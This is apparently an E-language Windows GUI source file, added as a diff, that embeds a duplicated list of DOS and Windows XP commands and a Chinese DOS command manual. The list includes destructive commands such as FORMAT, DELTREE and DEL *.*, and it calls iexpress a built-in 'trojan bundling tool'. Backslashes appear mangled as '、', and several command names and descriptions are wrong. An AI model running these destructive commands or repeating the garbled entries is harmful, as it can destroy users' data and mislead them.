@@ -1,0 +1,1836 @@
+ ' 文件类型：Windows窗口程序
+
+ ' 程序名称：
+ ' 程序描述：
+ ' 程序作者：本源码来自易语言资源网(www.5A5X.com)
+ ' 邮政编码：
+ ' 联系地址：
+ ' 联系电话：
+ ' 传真号码：
+ ' 电子信箱：
+ ' 主页地址：
+ ' 版权声明：             易语言资源网注意事项
+--============   www.5A5X.com  =============--
+* 易语言资源网为易语言官方站、易语言官方论坛提供辅助资源站；本易语言资源网( www.5A5X.com)所有软件和资料均为软件作者提供和网友推荐发布而来，其版权归该软件和程序源码的合法拥有者所有，本站易语言资源网整理收集仅供易语言用户学习和易语言技术研究探讨使用，不得用于任何商业用途。如果由于以上原因造成的版权纠纷本站概不负责！
+* 本站资源未经许可,任何网站不得非法盗链及抄袭本站资源；如引用，请注明来自易语言资源网，谢谢合作！
+--============   www.5A5X.com  =============--
+ ' 版本号：1.0
+ ' 创建号：0.0
+
+窗口 _启动窗口 ' 在程序启动后自动调入本窗口
+    左边 = 50
+    顶边 = 50
+    宽度 = 595
+    高度 = 404
+    鼠标指针 = { 0,0,0,0 }
+    标记 = “”
+    可视 = 真
+    禁止 = 假
+    边框 = 1
+    底图方式 = 1
+    底色 = -16777216 '  0xFF000000
+    最大化按钮 = 真
+    最小化按钮 = 真
+    控制按钮 = 真
+    位置 = 1
+    可否移动 = 真
+    背景音乐播放次数 = 0
+    回车下移焦点 = 假
+    Esc键关闭 = 真
+    F1键打开帮助 = 假
+    帮助标志值 = 0
+    在任务栏中显示 = 真
+    随意移动 = 假
+    外形 = 0
+    总在最前 = 假
+    保持标题栏激活 = 假
+    底图 =  ' 空
+    图标 =  ' 空
+    背景音乐 =  ' 空
+    标题 = “控制台交互操作实用版 - 王军 kindows@sina.com  QQ 89006400”
+    帮助文件名 = “”
+
+
+
+.常量 常_命令, "“001. CLS && REM --------------清屏
+002. DIR && REM 列表
+003. VER && REM 查看系统版本号命令
+004. CD && REM 改变当前目录,后接目录 CD /D 可直接进入指定盘符的目录.
+005. REN && REM 文件改名命令　,后接文件名
+006. DEL && REM ——删除文件命令,后接文件
+007. UNDELETE && REM ——恢复删除命令
+008. DATA && REM 日期设置命令
+009. TIME && REM 系统时钟设置命令
+010. MSD && REM 显示系统信息命令
+011. LABEL && REM ——建立磁盘卷标命令
+012. MD && REM ——建立子目录,后接目录名
+013. RD && REM ——删除子目录命令　,后接目录名
+014. PATH && REM ——路径设置命令
+015. TREE && REM ——显示磁盘目录结构命令
+016. VOL && REM ——显示磁盘卷标命令
+017. SCANDISK && REM ——检测、修复磁盘命令　
+018. DEFRAG && REM ——重整磁盘命令　
+019. SYS && REM ——系统复制命令　
+020. COPY && REM 文件复制命令,后接文件名
+021. XCOPY && REM ——目录复制命令　
+022. TYPE && REM ——显示文件内容命令　
+023. FC && REM ——文件比较命令　
+024. ATTRIB && REM ——修改文件属性命令　
+025. DELTREE && REM ——删除整个目录命令　
+026. DISKCOPY && REM ——整盘复制命令
+027. CHKDSK && REM ——检查磁盘当前状态命令
+028. formAT && REM ——磁盘格式化命令,小心使用了.
+029. UNformAT && REM 恢复格式化命令
+030. ping && REM              测试网络是否连通
+031. PAUSE && REM   暂停
+001. gpedit.msc && REM -------组策略 
+002. sndrec32 && REM ---------录音机 
+003. Nslookup && REM ---------IP地址侦测器 
+004. explorer && REM ---------打开资源管理器 
+005. logoff && REM -----------注销命令 
+006. tsshutdn && REM ---------60秒倒计时关机命令 
+007. lusrmgr.msc && REM ------本机用户和组 
+008. services.msc && REM -----本地服务设置 
+009. oobe/msoobe /a && REM ------检查XP是否激活 
+010. notepad && REM ----------打开记事本 
+011. cleanmgr && REM ---------垃圾整理 
+012. net start messenger && REM ------开始信使服务 
+013. compmgmt.msc && REM -----计算机管理 
+014. net stop messenger && REM -------停止信使服务 
+015. conf && REM -------------启动netmeeting 
+016. dvdplay && REM ----------DVD播放器 
+017. charmap && REM ----------启动字符映射表 
+018. diskmgmt.msc && REM -----磁盘管理实用程序 
+019. calc && REM -------------启动计算器 
+020. dfrg.msc && REM ---------磁盘碎片整理程序 
+021. chkdsk.exe && REM -------Chkdsk磁盘检查 
+022. devmgmt.msc && REM ----- 设备管理器 
+023. regsvr32 /u *.dll && REM ------停止dll文件运行 
+024. drwtsn32 && REM -------- 系统医生 
+025. rononce -p  && REM ------15秒关机 
+026. dxdiag && REM -----------检查DirectX信息 
+027. regedt32 && REM ---------注册表编辑器 
+028. Msconfig.exe && REM -----系统配置实用程序 
+029. rsop.msc && REM ---------组策略结果集 
+030. mem.exe && REM ----------显示内存使用情况 
+031. regedit.exe && REM ------注册表 
+032. winchat && REM ----------XP自带局域网聊天 
+033. progman && REM ----------程序管理器 
+034. winmsd && REM -----------系统信息 
+035. perfmon.msc && REM ------计算机性能监测程序 
+036. winver && REM -----------检查Windows版本 
+037. sfc /scannow && REM -------扫描错误并复原 
+038. taskmgr && REM -------任务管理器（2000／xp／2003 
+039. winver && REM -----------检查Windows版本 
+040. wmimgmt.msc && REM ------打开windows管理体系结构(WMI) 
+041. wupdmgr && REM ----------windows更新程序 
+042. wscript && REM ----------windows脚本宿主设置 
+043. write && REM ------------写字板 
+044. winmsd && REM -----------系统信息 
+045. wiaacmgr && REM ---------扫描仪和照相机向导 
+046. winchat && REM ----------XP自带局域网聊天 
+047. mem.exe && REM ----------显示内存使用情况 
+048. Msconfig.exe && REM -----系统配置实用程序 
+049. mplayer2 && REM ---------简易widnows media player 
+050. mspaint && REM ----------画图板 
+051. mstsc && REM ------------远程桌面连接 
+052. mplayer2 && REM ---------媒体播放机 
+053. magnify && REM --------放大镜实用程序 
+054. mmc && REM -------打开控制台 
+055. mobsync && REM -----同步命令 
+056. dxdiag && REM ---------检查DirectX信息 
+057. drwtsn32 && REM ------ 系统医生 
+058. devmgmt.msc && REM  设备管理器 
+059. dfrg.msc && REM -------磁盘碎片整理程序 
+060. diskmgmt.msc && REM ---磁盘管理实用程序 
+061. dcomcnfg && REM -------打开系统组件服务 
+062. ddeshare && REM -------打开DDE共享设置 
+063. dvdplay && REM --------DVD播放器 
+064. net stop messenger && REM -----停止信使服务 
+065. net start messenger && REM ----开始信使服务 
+066. notepad && REM --------打开记事本 
+067. nslookup && REM -------网络管理的工具向导 
+068. ntbackup && REM -------系统备份和还原 
+069. narrator && REM -------屏幕“讲述人” 
+070. ntmsmgr.msc && REM ----移动存储管理器 
+071. ntmsoprq.msc && REM ---移动存储管理员操作请求 
+072. netstat -an && REM ----(TC)命令检查接口 
+073. syncapp && REM --------创建一个公文包 
+074. sysedit && REM --------系统配置编辑器 
+075. sigverif && REM -------文件签名验证程序 
+076. sndrec32 && REM -------录音机 
+077. shrpubw && REM --------创建共享文件夹 
+078. secpol.msc && REM -----本地安全策略 
+079. syskey && REM ---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 
+080. services.msc && REM ---本地服务设置 
+081. Sndvol32 && REM -------音量控制程序 
+082. sfc.exe && REM --------系统文件检查器 
+083. sfc /scannow && REM ---windows文件保护 
+084. tsshutdn && REM -------60秒倒计时关机命令 
+085. tourstart && REM ------xp简介（安装完成后出现的漫游xp程序） 
+086. taskmgr && REM --------任务管理器 
+087. eventvwr && REM -------事件查看器 
+088. eudcedit && REM -------造字程序 
+089. explorer && REM -------打开资源管理器 
+090. packager && REM -------对象包装程序 
+091. perfmon.msc && REM ----计算机性能监测程序 
+092. progman && REM --------程序管理器 
+093. regedit.exe && REM 注册表 
+094. rsop.msc && REM -------组策略结果集 
+095. regedt32 && REM -------注册表编辑器 
+096. rononce -p  && REM ----15秒关机 
+097. regsvr32 /u *.dll && REM ---停止dll文件运行 
+098. regsvr32 /u zipfldr.dll && REM ------取消ZIP支持 
+099. cmd.exe && REM ------CMD命令提示符 
+100. chkdsk.exe && REM -----Chkdsk磁盘检查 
+101. certmgr.msc && REM --证书管理实用程序 
+102. calc && REM -----------启动计算器 
+103. charmap && REM --------启动字符映射表 
+104. cliconfg && REM -------SQL SERVER 客户端网络实用程序 
+105. Clipbrd && REM --------剪贴板查看器 
+106. conf && REM -----------启动netmeeting 
+107. compmgmt.msc && REM ---计算机管理 
+108. cleanmgr && REM -------垃圾整理 
+109. ciadv.msc && REM ------索引服务程序 
+110. osk && REM ------------打开屏幕键盘 
+111. odbcad32 && REM -------ODBC数据源管理器 
+112. oobe/msoobe /a && REM ----检查XP是否激活 
+113. lusrmgr.msc && REM ----本机用户和组 
+114. logoff && REM ---------注销命令 
+115. iexpress && REM -------木马捆绑工具，系统自带 
+116. Nslookup && REM -------IP地址侦测器 
+117. fsmgmt.msc && REM -----共享文件夹管理器 
+118. utilman && REM --------辅助工具管理器 
+119. gpedit.msc && REM  ----组策略”", , 
+.常量 , , , 
+.常量 常_帮助1, "“W
+winver 检查Windows版本
+wmimgmt.msc 打开Windows管理体系结构(wmi)
+wupdmgr Windows更新程序
+wscript Windows脚本宿主设置
+write 写字板
+winmsd 系统信息
+wiaacmgr 扫描仪和照相机向导
+winchat xp自带局域网聊天
+M
+mem.exe 显示内存使用情况
+msconfig.exe 系统配置实用程序
+mplayer2 简易widnows media player
+mspaint 画图板
+mstsc 远程桌面连接
+mplayer2 媒体播放机
+magnify 放大镜实用程序
+mmc 打开控制台
+mobsync 同步命令
+D
+dxdiag 检查directx信息
+drwtsn32 系统医生
+devmgmt.msc 设备管理器
+dfrg.msc 磁盘碎片整理程序
+diskmgmt.msc 磁盘管理实用程序
+dcomcnfg 打开系统组件服务
+ddeshare 打开dde共享设置
+dvdplay dvd播放器
+N
+net stop messenger 停止信使服务
+net start messenger 开始信使服务
+notepad 打开记事本
+nslookup 网络管理的工具向导
+ntbackup 系统备份和还原
+narrator 屏幕“讲述人”
+ntmsmgr.msc 移动存储管理器
+ntmsoprq.msc 移动存储管理员操作请求
+netstat -an （tc）命令检查接口
+S
+syncapp 创建一个公文包
+sysedit 系统配置编辑器
+sigverif 文件签名验证程序
+sndrec32 录音机
+shrpubw 创建共享文件夹
+secpol.msc 本地安全策略
+syskey 系统加密，一旦加密就不能解开，保护Windows xp系统的双重密码
+services.msc 本地服务设置
+sndvol32 音量控制程序
+sfc.exe 系统文件检查器
+sfc /scannow windows文件保护
+T
+tsshutdn 60秒倒计时关机命令
+tourstart xp简介（安装完成后出现的漫游xp程序）
+taskmgr 任务管理器
+E
+eventvwr 事件查看器
+eudcedit 造字程序
+explorer 打开资源管理器
+P
+packager 对象包装程序
+perfmon.msc 计算机性能监测程序
+progman 程序管理器
+R
+regedit.exe 注册表
+rsop.msc 组策略结果集
+regedt32 注册表编辑器
+rononce -p 15秒关机
+regsvr32 /u *.dll 停止dll文件运行
+regsvr32 /u zipfldr.dll 取消zip支持
+C
+cmd.exe cmd命令提示符
+chkdsk.exe chkdsk磁盘检查
+certmgr.msc 证书管理实用程序
+calc 启动计算器
+charmap 启动字符映射表
+cliconfg sql server 客户端网络实用程序
+clipbrd 剪贴板查看器
+conf 启动netmeeting
+compmgmt.msc 计算机管理
+cleanmgr 垃圾整理
+ciadv.msc 索引服务程序
+O
+osk 打开屏幕键盘
+odbcad32 odbc数据源管理器
+oobe/msoobe /a 检查xp是否激活
+L
+lusrmgr.msc 本机用户和组
+logoff 注销命令
+I
+iexpress 木马捆绑工具，系统自带
+N
+nslookup ip地址侦测器
+F
+fsmgmt.msc 共享文件夹管理器
+U
+utilman 辅助工具管理器
+G
+gpedit.msc 组策略 
+”", , 
+.常量 常_帮助2, "“Nslookup――――――-IP地址侦测器                            
+explorer――――――-打开资源管理器 
+logoff――――――――-注销命令                                
+tsshutdn――――――-60秒倒计时关机命令 
+lusrmgr.msc――――本机用户和组                           
+ services.msc――-本地服务设置 
+oobe/msoobe /a――――检查XP是否激活                       
+notepad――――――――打开记事本 
+cleanmgr――――――-垃圾整理                                
+net start messenger――――开始信使服务 
+compmgmt.msc――-计算机管理                              
+net stop messenger――――-停止信使服务 
+conf――――――――――-启动netmeeting                          
+dvdplay――――――――DVD播放器 
+charmap――――――――启动字符映射表                          
+diskmgmt.msc――-磁盘管理实用程序 
+calc――――――――――-启动计算器                              
+dfrg.msc――――――-磁盘碎片整理程序 
+chkdsk.exe――――-Chkdsk磁盘检查                          
+devmgmt.msc――- 设备管理器 
+regsvr32 /u *.dll――――停止dll文件运行                   
+drwtsn32―――――― 系统医生 
+rononce -p ――――15秒关机                                
+dxdiag――――――――-检查DirectX信息 
+regedt32――――――-注册表编辑器                            
+Msconfig.exe――-系统配置实用程序 
+rsop.msc――――――-组策略结果集                            
+mem.exe――――――――显示内存使用情况 
+regedit.exe――――注册表                                  
+winchat――――――――XP自带局域网聊天 
+progman――――――――程序管理器                              
+winmsd――――――――-系统信息 
+perfmon.msc――――计算机性能监测程序                      
+winver――――――――-检查Windows版本  
+sfc /scannow――――-扫描错误并复原 
+taskmgr――――-任务管理器（2000／xp／2003 
+winver――――――――-检查Windows版本  
+wmimgmt.msc――――打开windows管理体系结构(WMI)  
+wupdmgr――――――――windows更新程序  
+w脚本――――――――windows脚本宿主设置  
+write――――――――――写字板  
+winmsd――――――――-系统信息  
+wiaacmgr――――――-扫描仪和照相机向导  
+winchat――――――――XP自带局域网聊天 
+mem.exe――――――――显示内存使用情况  
+Msconfig.exe――-系统配置实用程序  
+mplayer2――――――-简易widnows media player  
+mspaint――――――――画图板  
+mstsc――――――――――远程桌面连接  
+mplayer2――――――-媒体播放机  
+magnify――――――――放大镜实用程序  
+mmc――――――――――――打开控制台  
+mobsync――――――――同步命令 
+dxdiag――――――――-检查DirectX信息  
+drwtsn32―――――― 系统医生  
+devmgmt.msc――- 设备管理器  
+dfrg.msc――――――-磁盘碎片整理程序  
+diskmgmt.msc――-磁盘管理实用程序  
+dcomcnfg――――――-打开系统组件服务  
+ddeshare――――――-打开DDE共享设置  
+dvdplay――――――――DVD播放器 
+net stop messenger――――-停止信使服务  
+net start messenger――――开始信使服务  
+notepad――――――――打开记事本  
+nslookup――――――-网络管理的工具向导  
+ntbackup――――――-系统备份和还原  
+narrator――――――-屏幕“讲述人”  
+ntmsmgr.msc――――移动存储管理器  
+ntmsoprq.msc――-移动存储管理员操作请求  
+netstat -an――――(TC)命令检查接口 
+syncapp――――――――创建一个公文包  
+sysedit――――――――系统配置编辑器  
+sigverif――――――-文件签名验证程序  
+sndrec32――――――-录音机  
+shrpubw――――――――创建共享文件夹  
+secpol.msc――――-本地安全策略  
+syskey――――――――-系统加密，一旦加密就不能解开，保护windows xp系统的双重密码  
+services.msc――-本地服务设置  
+Sndvol32――――――-音量控制程序  
+sfc.exe――――――――系统文件检查器  
+sfc /scannow――-windows文件保护 
+tsshutdn――――――-60秒倒计时关机命令  
+tourstart――――――xp简介（安装完成后出现的漫游xp程序）  
+taskmgr――――――――任务管理器 
+eventvwr――――――-事件查看器  
+eudcedit――――――-造字程序  
+explorer――――――-打开资源管理器 
+packager――――――-对象包装程序  
+perfmon.msc――――计算机性能监测程序  
+progman――――――――程序管理器 
+regedit.exe――――注册表  
+rsop.msc――――――-组策略结果集  
+regedt32――――――-注册表编辑器  
+rononce -p ――――15秒关机  
+regsvr32 /u *.dll――――停止dll文件运行  
+regsvr32 /u zipfldr.dll――――――取消ZIP支持 
+cmd.exe――――――――CMD命令提示符  
+chkdsk.exe――――-Chkdsk磁盘检查  
+certmgr.msc――――证书管理实用程序  
+calc――――――――――-启动计算器  
+charmap――――――――启动字符映射表  
+cliconfg――――――-SQL SERVER 客户端网络实用程序  
+Clipbrd――――――――剪贴板查看器  
+conf――――――――――-启动netmeeting  
+compmgmt.msc――-计算机管理  
+cleanmgr――――――-垃圾整理  
+ciadv.msc――――――索引服务程序 
+osk――――――――――――打开屏幕键盘  
+odbcad32――――――-ODBC数据源管理器  
+oobe/msoobe /a――――检查XP是否激活  
+lusrmgr.msc――――本机用户和组  
+logoff――――――――-注销命令 
+iexpress――――――-木马捆绑工具，系统自带 
+Nslookup――――――-IP地址侦测器 
+fsmgmt.msc――――-共享文件夹管理器 
+utilman――――――――辅助工具管理器 
+gpedit.msc――――-组策略 ”", , 
+.常量 常_帮助3, "“DOS命令大全
+一）MD——建立子目录 　
+1．功能：创建新的子目录　
+2．类型：内部命令　
+3．格式：MD[盘符：][路径名]〈子目录名〉　
+4．使用说明：　
+（1）“盘符”：指定要建立子目录的磁盘驱动器字母，若省略，则为当前驱动器；　
+（2）“路径名”：要建立的子目录的上级目录名，若缺省则建在当前目录下。　
+例：（1）在C盘的根目录下创建名为FOX的子目录；（2）在FOX子目录下再创建USER子目录。　
+C：、＞MD FOX （在当前驱动器C盘下创建子目录FOX）　
+C：、＞MD FOX 、USER （在FOX 子目录下再创建USER子目录）　
+（二）CD——改变当前目录　
+1．功能：显示当前目录　
+2．类型：内部命令　
+3．格式：CD[盘符：][路径名][子目录名]　
+4．使用说明：　
+（1）如果省略路径和子目录名则显示当前目录；　
+（2）如采用“CD、”格式，则退回到根目录；　
+（3）如采用“CD.。”格式则退回到上一级目录。　
+例：（1）进入到USER子目录；（2）从USER子目录退回到子目录；（3）返回到根目录。　
+C:、＞CD FOX 、USER（进入FOX子目录下的USER子目录）　
+C:、FOX、USER＞CD.。 （退回上一级根目录）　
+C：、FOX＞CD、 （返回到根目录）　
+C：、＞　
+（三）RD——删除子目录命令　
+1．功能：从指定的磁盘删除了目录。　
+2．类型：内部命令　
+3．格式：RD[盘符：][路径名][子目录名]　
+4．使用说明：　
+（1）子目录在删除前必须是空的，也就是说需要先进入该子目录，使用DEL（删除文件的命令）将其子目录下的文件删空，然后再退回到上一级目录，用RD命令删除该了目录本身；　
+（2）不能删除根目录和当前目录。　
+例：要求把C盘FOX子目录下的USER子目录删除，操作如下：　
+第一步：先将USER子目录下的文件删空；　
+C、＞DEL C：、FOX、USER、*。*　
+第二步，删除USER子目录。　
+C、＞RD Ｃ：、FOX、USER　
+（四）DIR——显示磁盘目录命令　
+1．功能：显示磁盘目录的内容。　
+2．类型：内部命令　
+3．格式：DIR [盘符][路径][/P][/W]　
+4．
+使用说明：/P的使用；当欲查看的目录太多，无法在一屏显示完屏幕会一直往上卷，不容易看清，加上/P参数后，屏幕上会分面一次显示23行的文件信息，然后暂停，并提示；Press
+any key to continue　
+/W的使用：加上/W只显示文件名，至于文件大小及建立的日期和时间则都省略。加上参数后，每行可以显示五个文件名。　
+PATH——路径设置命令　
+1．功能：设备可执行文件的搜索路径，只对文件有效。　
+2．类型：内部命令　
+3．格式：PATH[盘符1]目录[路径名1]{[；盘符2：]，〈目录路径名2〉…}　
+4．使用说明：　
+（1）当运行一个可执行文件时，DOS会先在当前目录中搜索该文件，若找到则运行之；若找不到该文件，则根据PATH命令所设置的路径，顺序逐条地到目录中搜索该文件；　
+（2）PATH命令中的路径，若有两条以上，各路径之间以一个分号“；”隔开；　
+（3）PATH命令有三种使用方法：　
+PATH[盘符1：][路径1][盘符2：][路径2]…（设定可执行文件的搜索路径）　 PATH：（取消所有路径）　
+PATH：（显示目前所设的路径）　
+（六）TREE——显示磁盘目录结构命令　
+1．功能：显示指定驱动器上所有目录路径和这些目录下的所有文件名。　
+2．类型：外部命令　
+3．格式：TREE[盘符：][/F][》PRN]　
+4．使用说明：　
+（1）使用/F参数时显示所有目录及目录下的所有文件，省略时，只显示目录，不显示目录下的文件；　
+（2）选用＞PRN参数时，则把所列目录及目录中的文件名打印输出。　
+（七）DELTREE——删除整个目录命令　
+1．功能：将整个目录及其下属子目录和文件删除。　
+2．类型：外部命令　
+3．格式：DELTREE[盘符：]〈路径名〉　
+4．使用说明：该命令可以一步就将目录及其下的所有文件、子目录、更下层的子目录一并删除，而且不管文件的属性为隐藏、系统或只读，只要该文件位于删除的目录之下，DELTREE都一视同仁，照删不误。使用时务必小心！！！　
+五、磁盘操作类命令　
+（一）formAT——磁盘格式化命令　
+1．功能：对磁盘进行格式化，划分磁道和扇区；同时检查出整个磁盘上有无带缺陷的磁道，对坏道加注标记；建立目录区和文件分配表，使磁盘作好接收DOS的准备。　
+2．类型：外部命令　
+3．格式：formAT〈盘符：〉[/S][/4][/Q]　
+4．使用说明：　
+（1）命令后的盘符不可缺省，若对硬盘进行格式化，则会如下列提示：WARNING:ALL DATA ON NON
+——REMOVABLE DISK　
+DRIVE C:WILL BE LOST ！　
+Proceed with format (Y/N)？　
+（警告：所有数据在C盘上，将会丢失，确实要继续格式化吗？）　
+（2）若是对软盘进行格式化，则会如下提示：Insert mew diskette for drive A;　
+and press ENTER when ready…　
+（在A驱中插入新盘，准备好后按回车键）。　
+（3）选用[/S]参数，将把DOS系统文件IO.SYS
+、MSDOS.SYS及COMMAND.COM复制到磁盘上，使该磁盘可以做为DOS启动盘。若不选用/S参数，则格式化后的磙盘只能读写信息，而不能做为启动盘；　
+（4）选用[/4]参数，在1.2MB的高密度软驱中格式化360KB的低密度盘；　
+（5）选用[/Q]参数，快速格式化，这个参数并不会重新划分磁盘的磁道貌岸然和扇区，只能将磁盘根目录、文件分配表以及引导扇区清成空白，因此，格式化的速度较快。　
+（6）选用[/U]参数，表示无条件格式化，即破坏原来磁盘上所有数据。不加/U，则为安全格式化，这时先建立一个镜象文件保存原来的FAT表和根目录，必要时可用UNFORRMAT恢复原来的数据。　
+（二）UNformAT恢复格式化命令　
+1．功能：对进行过格式化误操作丢失数据的磁盘进行恢复。　
+2．类型：外部命令　
+3．格式：UNformAT〈盘符〉[/L][/U][/P][/TEST]　
+4．使用说明：用于将被“非破坏性”格式化的磁盘恢复。根目录下被删除的文件或子目录及磁盘的系统扇区（包括FAT、根目录、BOOT扇区及硬盘分区表）受损时，也可以用UNformAT来抢救。　
+（1）选用/L参数列出找到的子目录名称、文件名称、大孝日期等信息，但不会真的做formAT工作。　
+（2）选用/P参数将显示于屏幕的报告（包含/L参数所产生的信息）同时也送到打印机。运行时屏幕会显示：“Print out will
+be sent to LPT1”　
+（3）选用/TEST参数只做模拟试验（TEST）不做真正的写入动作。使用此参数屏幕会显示：“Simulation only”　
+（4）选用/U参数不使用MIRROR映像文件的数据，直接根据磁盘现状进行UNformAT。　
+（5）选用/PSRTN；修复硬盘分区表。　
+若在盘符之后加上/P、/L、/TEST之一，都相当于使用了/U参数，UNformAT会“假设”此时磁盘没有MIRROR映像文件。　
+注意：UNformAT对于刚formAT的磁盘，可以完全恢复，但formAT后若做了其它数据的写入，则UNformAT就不能完整的救回数据了。UNformAT并非是万能的，由于使用UNformAT会重建FAT与根目录，所以它也具有较高的危险性，操作不当可能会扩大损失，如果仅误删了几个文件或子目录，只需要利用UNDELETE就够了。
+三） CHKDSK——检查磁盘当前状态命令　
+1．功能：显示磁盘状态、内存状态和指定路径下指定文件的不连续数目。　
+2．类型：外部命令　
+3．格式：CHKDSK [盘符：][路径][文件名][/F][/V]　
+4．使用说明：　
+（1）选用[文件名]参数，则显示该文件占用磁盘的情况；　
+（2）选[/F]参数，纠正在指定磁盘上发现的逻辑错误；　
+（3）选用[/V]参数，显示盘上的所有文件和路径。　
+（四）DISKCOPY——整盘复制命令　
+1．功能：复制格式和内容完全相同的软盘。　
+2．类型：外部命令　
+3．格式：DISKCOPY[盘符1：][盘符2：]　
+4．使用说明：　
+（1）如果目标软盘没有格式化，则复制时系统自动选进行格式化。　
+（2）如果目标软盘上原有文件，则复制后将全部丢失。　
+（3）如果是单驱动器复制，系统会提示适时更换源盘和目标盘，请操作时注意分清源盘和目标盘。　
+（五）LABEL——建立磁盘卷标命令　
+1．功能：建立、更改、删除磁盘卷标。　
+2．类型：外部命令　
+3．格式：LABEL[盘符：][卷标名]　
+4．使用说明：　
+（1）卷标名为要建立的卷标名，若缺省此参数，则系统提示键入卷标名或询问是否删除原有的卷标名；　
+（2）卷标名由1至11个字符组成。　
+（六）VOL——显示磁盘卷标命令　
+1．功能：查看磁盘卷标号。　
+2．类型：内部命令　
+3．格式：VOL[盘符：]　
+4．使用说明：省略盘符，显示当前驱动器卷标。　
+（七）SCANDISK——检测、修复磁盘命令　
+1．功能：检测磁盘的FAT表、目录结构、文件系统等是否有问题，并可将检测出的问题加以修复。　
+2．类型：外部命令　
+3．格式：SCANDISK[盘符1：]{[盘符2：]…}[/ALL]　
+4．使用说明：　
+（1）CCANDISK适用于硬盘和软盘，可以一次指定多个磁盘或选用[/ALL]参数指定所有的磁盘；　
+（2）可自动检测出磁盘中所发生的交叉连接、丢失簇和目录结构等逻辑上的错误，并加以修复。　
+（八）DEFRAG——重整磁盘命令　
+1．。功能：整理磁盘，消除磁盘碎块。　
+2．类型：外部命令　
+3．格式：DEFRAG[盘符：][/F]　
+4．使用说明：选用/F参数，将文件中存在盘上的碎片消除，并调整磁盘文件的安排，确保文件之间毫无空隙。从而加快读盘速度和节省磁盘空间。　
+（九）SYS——系统复制命令　
+1．功能：将当前驱动器上的DOS系统文件IO.SYS,MSDOS.SYS和COMMAND.COM 传送到指定的驱动器上。　
+2．类型：外部命令　
+3．格式：SYS[盘符：]　
+*使用说明：如果磁盘剩余空间不足以存放系统文件，则提示：No roomfor on destination disk.　
+文件操作类命令　
+（一） COPY文件复制命令　
+1．功能：拷贝一个或多个文件到指定盘上。　
+2．类型：内部命令　
+3．格式：COPY [源盘][路径]〈源文件名〉[目标盘][路径][目标文件名]　
+4．使用说明：　
+（1）COPY是文件对文件的方式复制数据，复制前目标盘必须已经格式化；　
+（2）复制过程中，目标盘上相同文件名称的旧文件会被源文件取代；　
+（3）复制文件时，必须先确定目标般有足够的空间，否则会出现；insufficient的错误信息，提示磁盘空间不够；　
+（4）文件名中允许使用通配举“*”“？”，可同时复制多个文件；　
+（5）COPY命令中源文件名必须指出，不可以省略。　
+（6）复制时，目标文件名可以与源文件名相同，称作“同名拷贝”此时目标文件名可以省略；　
+（7）复制时，目标文件名也可以与源文件名不相同，称作“异名拷贝”，此时，目标文件名不能省略；　
+（8）复制时，还可以将几个文件合并为一个文件，称为“合并拷贝”，格式如下：COPY；[源盘][路径]〈源文件名1〉〈源文件名2〉…[目标盘][路径]〈目标文件名〉；　
+（9）利用COPY命令，还可以从键盘上输入数据建立文件，格式如下：COPY CON [盘符：][路径]〈文件名〉；　
+（10）注意：COPY命令的使用格式，源文件名与目标文件名之间必须有空格！　
+（二）XCOPY——目录复制命令　
+1．功能：复制指定的目录和目录下的所有文件连同目录结构。　
+2．类型：外部命令　
+3．格式：XCOPY [源盘：]〈源路径名〉[目标盘符：][目标路径名][/S][/V][/E]　
+4．使用说明：　
+（1）XCOPY是COPY的扩展，可以把指定的目录连文件和目录结构一并拷贝，但不能拷贝隐藏文件和系统文件；　
+（2）使用时源盘符、源目标路径名、源文件名至少指定一个；　
+（3）选用/S时对源目录下及其子目录下的所有文件进行COPY。除非指定/E参数，否则/S不会拷贝空目录，若不指定/S参数，则XCOPY只拷贝源目录本身的文件，而不涉及其下的子目录；　
+（4）选用/V参数时，对的拷贝的扇区都进行较验，但速度会降低。　
+（三）TYPE——显示文件内容命令　
+1．功能：显示ASCII码文件的内容。　
+2．类型：内部命令。　
+3．格式：TYPE[盘符：][路径]〈文件名〉　
+4．使用说明：　
+（1）显示由ASCII码组成的文本文件，对。EXE.COM等为扩展名的文件，其显示的内容是无法阅读的，没有实际意义2；　
+（2）该命令一次只可以显示一个文件的内容，不能使用通配符；　
+（3）如果文件有扩展名，则必须将扩展名写上；　
+（4）当文件较长，一屏显示不下时，可以按以下格式显示；TYPE[盘符：][路径]〈文件名〉|MORE，MORE为分屏显示命令，使用些参数后当满屏时会暂停，按任意键会继续显示。　
+（5）若需将文件内容打印出来，可用如下格式：　
+TYPE[盘符：][路径]〈文件名〉，＞PRN　
+此时，打印机应处于联机状态。　
+（四） REN——文件改名命令　
+1．功能：更改文件名称　
+2．类型：内部命令　
+3．格式：REN[盘符：][路径]〈旧文件名〉〈新文件名〉　
+4．使用说明：　
+（1）新文件名前不可以加上盘符和路径，因为该命令只能对同一盘上的文件更换文件名；　
+（2）允许使用通配符更改一组文件名或扩展名。　
+（五）FC——文件比较命令　
+1．功能：比较文件的异同，并列出差异处。　
+2．类型：外部命令　
+3．格式：FC[盘符：][路径名]〈文件名〉[盘符：][路径名][文件名][/A][/C][/N]　
+4．使用说明：　
+（1）选用/A参数，为ASCII码比较模式；　
+（2）选用/B参数，为二进制比较模式；　
+（3）选用/C参数，将大小写字符看成是相同的字符。　
+（4）选用/N参数，在ASCII码比较方式下，显示相异处的行号。　
+（六）ATTRIB——修改文件属性命令　
+1．功能：修改指定文件的属性。（文件属性参见2.5.4（二）文件属性一节）　
+2．类型：外部命令。　
+3．格式：ATTRIB[文件名][R][——R][A][——A][H][——H][——S]　
+4．使用说明：　
+（1）选用R参数，将指定文件设为只读属性，使得该文件只能读取，无法写入数据或删除；选用——R参数，去除只读属性；　
+（2）选用A参数，将文件设置为档案属性；选用——A参数，去除档案属性；　 （3）选用H参数，将文件调协为隐含属性；选用——H参数，去隐含属性；　
+（4）选用S参数，将文件设置为系统属性；选用——S参数，去除系统属性；　 （5）选用/S参数，对当前目录下的所有子目录及作设置。　
+七） DEL——删除文件命令　
+1．功能：删除指定的文件。　
+2．类型：内部命令　
+3．格式：DEL[盘符：][路径]〈文件名〉[/P]　
+4．使用说明：　
+（1）选用/P参数，系统在删除前询问是否真要删除该文件，若不使用这个参数，则自动删除；　
+（2）该命令不能删除属性为隐含或只读的文件；
+（3）在文件名称中可以使用通配符；
+（4）若要删除磁盘上的所有文件（DEL*·*或DEL·），则会提示：(Arey ou sure？）（你确定吗？）若回答Y，则进行删除，回答N，则取消此次删除作业。
+    （八） UNDELETE——恢复删除命令
+    1．功能：恢复被误删除命令
+    2．类型：外部命令。
+    3．格式：UNDELETE[盘符：][路径名]〈文件名〉[/DOS]/LIST][/ALL]
+    4．使用说明：使用UNDELETE可以使用“*”和“？”通配符。
